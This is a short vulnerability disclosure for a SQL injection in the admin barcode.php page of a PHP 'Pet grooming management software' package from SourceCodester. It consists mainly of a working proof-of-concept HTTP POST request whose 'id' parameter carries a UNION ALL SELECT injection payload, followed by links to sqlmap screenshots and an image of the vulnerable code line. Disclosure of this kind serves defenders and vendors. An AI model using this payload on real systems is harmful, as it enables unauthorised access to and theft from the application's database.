### Pet grooming management software - SQLi

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18340/pet-grooming-management-software-download.html
### Tested on: MacOs13.5 + phpstudy

# /barcode.php（SQLi）

### Sample request POC #1

```
POST /admin/barcode.php HTTP/1.1
Host: localhost:8887
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

id='+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CCONCAT(0x71627a7171%2C0x776651685454524e746b6f6568736d41486d63685176556642754e4d626348654953785243695952%2C0x71716a7871)%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
```

### sqlmap

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-142507.png "Pet grooming management software")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-142701.png "Pet grooming management software")

### Vulnerability code
barcode.php:61
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-142737.png "Pet grooming management software")
